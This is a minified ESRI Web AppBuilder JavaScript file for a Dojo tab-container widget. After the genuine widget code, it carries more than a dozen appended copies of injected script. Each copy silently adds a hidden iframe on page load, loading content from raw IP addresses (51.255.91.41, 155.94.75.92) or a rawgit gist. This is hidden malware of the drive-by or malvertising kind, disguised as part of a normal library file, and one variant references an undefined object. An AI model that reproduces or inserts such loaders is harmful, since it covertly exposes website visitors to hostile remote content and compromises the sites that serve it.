// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
require({cache:{"url:jimu/dijit/templates/TabContainer3.html":'\x3cdiv\x3e\r\n  \x3cdiv class\x3d"control-node" data-dojo-attach-point\x3d"controlNode"\x3e\r\n    \x3ctable data-dojo-attach-point\x3d"controlTable" class\x3d"control-table" cellpading\x3d"0"\x3e\r\n      \x3ctbody\x3e\r\n        \x3ctr data-dojo-attach-point\x3d"tabTr"\x3e\r\n        \x3c/tr\x3e\r\n      \x3c/tbody\x3e\r\n    \x3c/table\x3e\r\n  \x3c/div\x3e\r\n  \x3cdiv class\x3d"container-node" data-dojo-attach-point\x3d"containerNode"\x3e\x3c/div\x3e\r\n  \x3cdiv class\x3d"tab-shelter" data-dojo-attach-point\x3d"shelter"\x3e\x3c/div\x3e\r\n\x3c/div\x3e'}});
define("dojo/_base/declare dojo/_base/lang dojo/_base/array dojo/_base/html dojo/on dojo/Evented dojo/query dijit/_WidgetBase dijit/_TemplatedMixin dojo/text!./templates/TabContainer3.html jimu/dijit/ViewStack".split(" "),function(h,e,d,c,k,l,f,m,n,p,q){return h([m,n,l],{templateString:p,baseClass:"jimu-tab3",declaredClass:"jimu.dijit.TabContainer3",_currentIndex:-1,selected:"",tabs:null,average:!0,postCreate:function(){this.inherited(arguments);this._initSelf();this.selected?this.selectTab(this.selected):
0<this.tabs.length&&this.selectTab(this.tabs[0].title)},selectTab:function(b){var a=f("td",this.tabTr);d.forEach(a,e.hitch(this,function(a,d){c.removeClass(a,"jimu-state-active");a.label===b&&(c.addClass(a,"jimu-state-active"),this._currentIndex=d)}));this.controlNode.removeChild(this.controlTable);c.place(this.controlTable,this.controlNode);this.viewStack.switchView(b);this.emit("tabChanged",b)},addTab:function(b){if(!this.average){var a=f("td:last-child",this.tabTr);0<a.length&&c.destroy(a[0])}0<
d.filter(this.tabs,function(a){return a.title===b.title}).length?console.error("tab title conflict: "+b.title):(this.tabs.push(b),this._createTab(b),this.average||(a=c.toDom('\x3ctd nowrap class\x3d"tab-item-td" style\x3d"border-bottom:1px solid #ccc;"\x3e\x3cdiv class\x3d"tab-item-div"\x3e\x3c/div\x3e\x3c/td\x3e'),c.place(a,this.tabTr)))},removeTab:function(b){var a=-1;if(d.some(this.tabs,function(c,d){if(c.title===b)return a=d,!0})){var r=this.tabs.splice(a,1)[0],e=f("td",this.tabTr),g;d.some(e,
function(a){if(a.label===b)return g=a,!0})&&c.destroy(g);this.viewStack.removeView(r.content)}},showShelter:function(){c.setStyle(this.shelter,"display","block")},hideShelter:function(){c.setStyle(this.shelter,"display","none")},getSelectedIndex:function(){return this._currentIndex},getSelectedTitle:function(){return this.viewStack.getSelectedLabel()},_initSelf:function(){this.viewStack=new q(null,this.containerNode);d.forEach(this.tabs,function(a){this._createTab(a)},this);if(this.average)this.controlTable.style.tableLayout=
"fixed",c.addClass(this.domNode,"average");else{var b=c.toDom('\x3ctd nowrap class\x3d"tab-item-td" style\x3d"border-bottom:1px solid #ccc;"\x3e\x3cdiv class\x3d"tab-item-div"\x3e\x3c/div\x3e\x3c/td\x3e');c.place(b,this.tabTr)}},startup:function(){this.inherited(arguments);this._started=!0},_createTab:function(b){var a=c.toDom('\x3ctd nowrap class\x3d"tab-item-td"\x3e\x3cdiv class\x3d"tab-item-div"\x3e\x3c/div\x3e\x3c/td\x3e');a.label=b.title||"";c.place(a,this.tabTr);var d=f(".tab-item-div",a)[0];
d.innerHTML=a.label;d.label=a.label;b.content.label=a.label;this.viewStack.addView(b.content);this.own(k(a,"click",e.hitch(this,this._onSelect,b.title)))},_onSelect:function(b){this.selectTab(b)}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});